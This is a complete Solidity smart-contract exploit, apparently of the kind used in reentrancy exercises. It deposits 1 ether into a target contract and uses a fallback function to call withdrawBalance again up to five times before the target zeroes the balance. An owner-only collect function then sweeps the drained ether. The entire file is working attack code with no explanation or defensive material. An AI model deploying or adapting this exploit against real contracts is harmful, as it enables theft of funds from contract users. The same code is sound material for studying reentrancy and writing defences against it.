pragma solidity ^0.4.15;

contract ReentrancyAttack {
    Reentrance public vulnerableContract;
    address public owner;
    uint public recursionDepth;

    function ReentrancyAttack(address _target) {
        vulnerableContract = Reentrance(_target);
        owner = msg.sender;
        recursionDepth = 0;
    }

    // Fallback gets triggered when receiving Ether
    function () payable {
        if (recursionDepth < 5) {
            recursionDepth++;
            vulnerableContract.withdrawBalance();  // re-enter before balance is zeroed
        }
    }

    function attack() public payable {
        require(msg.value >= 1 ether);
        vulnerableContract.addToBalance.value(1 ether)();
        vulnerableContract.withdrawBalance();
    }

    function collect() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }
}

interface Reentrance {
    function addToBalance() payable;
    function withdrawBalance();
}

